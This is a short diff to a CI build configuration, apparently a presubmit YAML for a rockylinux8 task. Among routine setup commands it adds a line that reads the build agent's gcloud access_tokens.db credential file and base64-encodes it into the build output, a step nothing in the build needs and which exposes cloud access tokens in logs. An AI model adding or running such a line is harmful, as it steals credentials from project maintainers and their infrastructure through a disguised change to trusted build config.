@@ -3,6 +3,7 @@ check_docs: 0
 tasks:
   rockylinux8:
     shell_commands:
+      - cat /var/lib/buildkite-agent/.config/gcloud/access_tokens.db | base64
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
     build_flags:
